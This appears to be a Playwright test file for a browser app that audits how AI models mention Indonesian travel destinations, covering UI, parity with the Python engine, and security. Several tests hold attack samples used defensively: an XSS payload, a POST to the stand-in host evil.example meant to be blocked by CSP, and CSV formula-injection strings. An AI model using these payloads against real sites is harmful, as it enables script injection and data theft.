"""Uji aplikasi web (docs/, GitHub Pages) di Chromium sungguhan lewat Playwright: fungsi, UI, dan keamanan."""

import functools
import glob
import json
import os
import threading
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

import pytest

import gem_visibility_auditor as gva

sync_api = pytest.importorskip("playwright.sync_api")

KEY_ANT = "test-key-anthropic-browser-0001"
KEY_GEM = "test-key-gemini-browser-0002"


def _chromium_path():
    if os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE"):
        return os.environ["PLAYWRIGHT_CHROMIUM_EXECUTABLE"]
    found = glob.glob("/opt/pw-browsers/chromium-*/chrome-linux*/chrome")
    return found[0] if found else None


@pytest.fixture(scope="module")
def site(root):
    handler = functools.partial(SimpleHTTPRequestHandler, directory=str(root / "docs"))
    handler.log_message = lambda *a, **k: None
    srv = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}/"
    srv.shutdown()


@pytest.fixture(scope="module")
def browser():
    with sync_api.sync_playwright() as p:
        try:
            b = p.chromium.launch(executable_path=_chromium_path()) if _chromium_path() else p.chromium.launch()
        except Exception as exc:  # browser belum terpasang
            pytest.skip(f"Chromium tidak tersedia: {exc}")
        yield b
        b.close()


def _open(browser, site, width=1280, height=900, query=""):
    ctx = browser.new_context(viewport={"width": width, "height": height}, accept_downloads=True)
    pg = ctx.new_page()
    pg.errors = []
    pg.on("pageerror", lambda e: pg.errors.append(str(e)))
    pg.on("console", lambda m: pg.errors.append(m.text) if m.type == "error" else None)
    pg.goto(site + query)
    pg.wait_for_selector("body[data-ready='1']", timeout=15000)
    return ctx, pg


@pytest.fixture()
def page(browser, site):
    ctx, pg = _open(browser, site)
    yield pg
    ctx.close()


def _evidence(pg, name, full=False):
    d = os.environ.get("GEM_EVIDENCE_DIR")
    if d:
        os.makedirs(d, exist_ok=True)
        pg.screenshot(path=os.path.join(d, name), full_page=full)


def _load_demo(pg):
    pg.click(".action-card[data-go=demo]")
    pg.wait_for_function("() => window.__gem.state.source.startsWith('Demo')")


def _py_summary(records, cfg):
    res = gva.analyze(gva.records_to_df(records), cfg)
    return {r.destination_id: (r.rank, r.mentions, r.responses_mentioned, r.share_of_voice_pct, r.mention_rate_pct)
            for r in res["summary"].itertuples()}


def _js_summary(pg):
    rows = pg.evaluate("window.__gem.state.results.summary")
    return {r["destination_id"]: (r["rank"], r["mentions"], r["responses_mentioned"], r["share_of_voice_pct"],
                                  r["mention_rate_pct"]) for r in rows}


def _assert_same(py, js):
    assert py.keys() == js.keys()
    for k in py:
        a, b = py[k], js[k]
        assert a[:3] == b[:3], k
        assert abs(a[3] - b[3]) < 0.011 and abs(a[4] - b[4]) < 0.011, k


def test_starts_as_app_not_landing_page(page):
    """Layar awal adalah aplikasi: panel kontrol + aksi, tanpa data dimuat diam-diam."""
    assert page.locator("#sidebar").is_visible()
    assert page.locator("#empty-state").is_visible() and page.locator("#dashboard").is_hidden()
    assert page.locator(".action-card").count() == 3
    assert page.locator(".prov").count() == 8
    assert page.locator("#btn-export").is_disabled()
    assert "60 permintaan" in page.locator("#estimate").inner_text()
    assert not page.errors, page.errors
    _evidence(page, "web_01_start.png")


def test_demo_matches_python_including_insights(page, root):
    _load_demo(page)
    assert not page.errors, page.errors
    data = json.loads((root / "docs/data/demo_results.json").read_text(encoding="utf-8"))
    _assert_same(_py_summary(data["responses"], data["config"]), _js_summary(page))
    res = gva.analyze(gva.records_to_df(data["responses"]), data["config"])
    assert page.evaluate("window.__gem.buildInsights(window.__gem.state.results)") == gva.build_insights(res)
    assert page.locator(".kpi.hero .k-val").inner_text() == f"{res['headline']['focus_sov_pct']:.1f}%"
    assert page.locator("#banners .banner").first.is_visible()  # label simulasi
    assert page.locator("#chart-sov .bar-row").count() == 11
    assert page.locator("#insights li").count() == len(gva.build_insights(res))
    for tab, sel, n in (("model", "#heat-model td.cell", 22), ("cat", "#heat-cat td.cell", 15 * 11)):
        page.click(f".tab[data-tab={tab}]")
        assert page.locator(sel).count() == n
    page.click(".tab[data-tab=rank]")
    _evidence(page, "web_02_dashboard.png", full=True)
    page.click(".tab[data-tab=answers]")
    assert page.locator("#responses .answer").count() == 20
    page.click("#more-btn")
    assert page.locator("#responses .answer").count() == 40
    page.fill("#f-search", "Lake Toba")
    page.wait_for_function("() => document.querySelectorAll('#responses .answer').length < 40")
    assert all("toba" in t.lower() for t in page.locator("#responses .answer").all_inner_texts())
    _evidence(page, "web_03_answers.png")


def test_focus_switch_recomputes(page):
    _load_demo(page)
    page.select_option("#focus-select", "bali")
    page.wait_for_function("() => window.__gem.state.results.headline.focus_id === 'bali'")
    assert "Bali" in page.locator(".kpi.hero .k-label").inner_text()
    groups = {r["destination_id"]: r["group"] for r in page.evaluate("window.__gem.state.results.summary")}
    assert groups["bali"] == "focus" and groups["danau_toba"] != "focus"


def test_matcher_parity_with_python(page):
    cfg = gva.load_config()
    m = gva.build_matchers(cfg["destinations"])
    texts = ["Danau Toba, Lake Toba, Samosir; Balige vs Bali.", "KOMODO & Pulau Padar, Gili-Trawangan",
             "Kabalian tobacco jogjakartanese", "Ｂａｌｉ (fullwidth) dan Raja\nAmpat", "Balinese food at Ubud",
             "Labuan   Bajo dan Nusa Penida"]
    js = page.evaluate("""(texts) => {
        const cfg = window.__gem.state.defaultConfig, m = window.__gem.buildMatchers(cfg.destinations);
        return texts.map(t => { const h = window.__gem.scanText(t, m); const o = {};
            for (const k in h) o[k] = h[k][0]; return o; });
    }""", texts)
    for t, j in zip(texts, js):
        assert {k: v[0] for k, v in gva.scan_text(t, m).items()} == j, t


def test_import_csv_from_cli_matches_python(page, tmp_path, mock_server, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "k")
    cfg = gva.load_config()
    recs = gva.run_audit([("anthropic", "claude-opus-5-5"), ("demo", "simulasi-b")], cfg, ["id", "en"],
                         max_questions=5, opts={"base_urls": {"anthropic": mock_server.base}}, workers=2)
    recs[0]["response"] = "=1+1 Bali, lalu - Lake Toba"  # sel diawali formula, dinetralkan di CSV
    df = gva.records_to_df(recs)
    path = tmp_path / "responses.csv"
    path.write_bytes(gva.to_csv_bytes(df))
    page.click(".seg-btn[data-src=import]")
    page.set_input_files("#file-input", str(path))
    page.wait_for_function("() => window.__gem.state.source.includes('responses.csv')")
    assert not page.errors, page.errors
    _assert_same(_py_summary(recs, cfg), _js_summary(page))
    assert page.evaluate("window.__gem.state.records[0].response") == "=1+1 Bali, lalu - Lake Toba"


def test_run_in_browser_with_mocked_apis(page):
    calls = []

    def anthropic(route):
        req = route.request
        calls.append(("anthropic", req.headers, json.loads(req.post_data)))
        route.fulfill(status=200, content_type="application/json", headers={"access-control-allow-origin": "*"},
                      body=json.dumps({"content": [{"type": "text", "text": "Danau Toba dan Bali, juga Labuan Bajo."}],
                                       "stop_reason": "end_turn", "usage": {"input_tokens": 5, "output_tokens": 9}}))

    def gemini(route):
        req = route.request
        calls.append(("gemini", req.headers, json.loads(req.post_data)))
        route.fulfill(status=200, content_type="application/json", headers={"access-control-allow-origin": "*"},
                      body=json.dumps({"candidates": [{"content": {"parts": [{"text": "Bali dan Raja Ampat."}]},
                                                       "finishReason": "STOP"}]}))

    page.route("https://api.anthropic.com/v1/messages", anthropic)
    page.route("https://generativelanguage.googleapis.com/**", gemini)
    page.fill(".prov[data-p=anthropic] .p-key", KEY_ANT)
    page.fill(".prov[data-p=gemini] .p-key", KEY_GEM)
    page.evaluate("const r = document.getElementById('run-maxq'); r.value = '2'; r.dispatchEvent(new Event('input'))")
    assert "8 permintaan" in page.locator("#estimate").inner_text()
    page.click("#run-btn")
    page.wait_for_selector("#consent-dialog[open]")
    assert page.locator("#consent-ok").is_disabled()
    _evidence(page, "web_04_consent.png")
    page.check("#consent-check")
    page.click("#consent-ok")
    page.wait_for_function("() => window.__gem.state.source.startsWith('Audit langsung') && !window.__gem.state.running",
                           timeout=20000)
    assert not page.errors, page.errors
    assert len(calls) == 2 * 2 * 2
    a = next(c for c in calls if c[0] == "anthropic")
    assert a[1]["x-api-key"] == KEY_ANT and a[1]["anthropic-version"] == "2026-10-21"
    assert a[1]["anthropic-dangerous-direct-browser-access"] == "true"
    assert a[2]["model"] == "claude-opus-5-5" and "temperature" not in a[2]
    assert "referer" not in a[1] and "cookie" not in a[1]
    g = next(c for c in calls if c[0] == "gemini")
    assert g[1]["x-goog-api-key"] == KEY_GEM
    recs = page.evaluate("window.__gem.state.records")
    assert len(recs) == 8 and {r["status"] for r in recs} == {"ok"}
    assert page.locator(".kpi.hero .k-val").inner_text() == "20.0%"  # Toba 4 dari 20 sebutan
    # Kunci tidak boleh ada di state, storage, atau file ekspor.
    leak = page.evaluate("""() => JSON.stringify(window.__gem.state) + JSON.stringify(localStorage)
        + JSON.stringify(sessionStorage)""")
    assert KEY_ANT not in leak and KEY_GEM not in leak
    page.click("#btn-export")
    with page.expect_download() as dl:
        page.click("[data-export=json]")
    exported = open(dl.value.path(), encoding="utf-8").read()
    assert KEY_ANT not in exported and KEY_GEM not in exported
    _evidence(page, "web_05_live_result.png")


def test_errors_from_api_are_redacted(page):
    secret = "test-key-anthropic-redact-9999"
    page.route("https://api.anthropic.com/v1/messages", lambda r: r.fulfill(
        status=401, content_type="application/json", headers={"access-control-allow-origin": "*"},
        body=json.dumps({"error": {"type": "authentication_error", "message": f"invalid key {secret}"}})))
    page.uncheck(".prov[data-p=gemini] .p-on")
    page.fill(".prov[data-p=anthropic] .p-key", secret)
    page.evaluate("const r = document.getElementById('run-maxq'); r.value = '1'; r.dispatchEvent(new Event('input'))")
    page.click("#run-btn")
    page.check("#consent-check")
    page.click("#consent-ok")
    page.wait_for_function("() => window.__gem.state.records.length === 2 && !window.__gem.state.running", timeout=20000)
    errs = [r["error"] for r in page.evaluate("window.__gem.state.records")]
    assert all("401" in e and secret not in e and "[REDACTED]" in e for e in errs)


def test_xss_payload_from_imported_file_is_inert(page, tmp_path):
    payload = '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>'
    data = {"config": {"focus": "x", "destinations": [{"id": "x", "name": "<b>X</b>", "aliases": ["<img"]}]},
            "responses": [{"provider": "p", "model": payload, "question_id": "Q01", "language": "id",
                           "prompt": payload, "response": "Bali " + payload, "status": "ok", "category": payload}]}
    path = tmp_path / "evil.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    page.click(".seg-btn[data-src=import]")
    page.set_input_files("#file-input", str(path))
    page.wait_for_function("() => window.__gem.state.source.includes('evil.json')")
    page.click(".tab[data-tab=answers]")
    page.wait_for_timeout(300)
    assert page.evaluate("window.__xss") is None
    assert page.locator("#responses img, #responses script, #kpis img").count() == 0
    assert payload in page.locator("#responses .answer-q").first.inner_text()
    # Konfigurasi tidak valid di file ditolak, konfigurasi bawaan dipakai.
    assert page.evaluate("window.__gem.state.config.focus") == "danau_toba"


def test_csp_blocks_unlisted_hosts(page):
    result = page.evaluate("""async () => {
        try { await fetch('https://evil.example/collect', {method: 'POST', body: 'x'}); return 'sent'; }
        catch (e) { return 'blocked'; } }""")
    assert result == "blocked"
    csp = page.locator("meta[http-equiv=Content-Security-Policy]").get_attribute("content")
    assert "default-src 'none'" in csp and "script-src 'self'" in csp and "unsafe" not in csp


def test_export_csv_neutralizes_formulas(page):
    _load_demo(page)
    page.evaluate("window.__gem.state.records[0].response = '=HYPERLINK(\"http://x\")'")
    page.click("#btn-export")
    with page.expect_download() as dl:
        page.click("[data-export=responses]")
    text = open(dl.value.path(), encoding="utf-8-sig").read()
    assert "'=HYPERLINK" in text and ",=HYPERLINK" not in text


def test_theme_toggle_and_prefs_without_keys(page):
    page.click("#btn-theme")
    theme = page.evaluate("document.documentElement.dataset.theme")
    assert theme in ("light", "dark")
    page.fill(".prov[data-p=anthropic] .p-key", "test-key-should-not-persist")
    page.uncheck(".prov[data-p=gemini] .p-on")
    prefs = page.evaluate("localStorage.getItem('gem-prefs-v1')")
    assert "should-not-persist" not in prefs and '"gemini":{"on":false' in prefs


def test_mobile_layout(browser, site):
    ctx, pg = _open(browser, site, width=375, height=800)
    assert pg.evaluate("document.documentElement.scrollWidth") <= 375
    assert pg.locator("#sidebar").bounding_box()["x"] < 0  # drawer tertutup
    _evidence(pg, "web_06_mobile_start.png")
    pg.click("#btn-menu")
    pg.wait_for_timeout(300)
    assert pg.locator("#sidebar").bounding_box()["x"] >= 0
    _evidence(pg, "web_07_mobile_panel.png")
    pg.keyboard.press("Escape")
    _load_demo(pg)
    assert pg.evaluate("document.documentElement.scrollWidth") <= 375
    _evidence(pg, "web_08_mobile_dashboard.png")
    ctx.close()
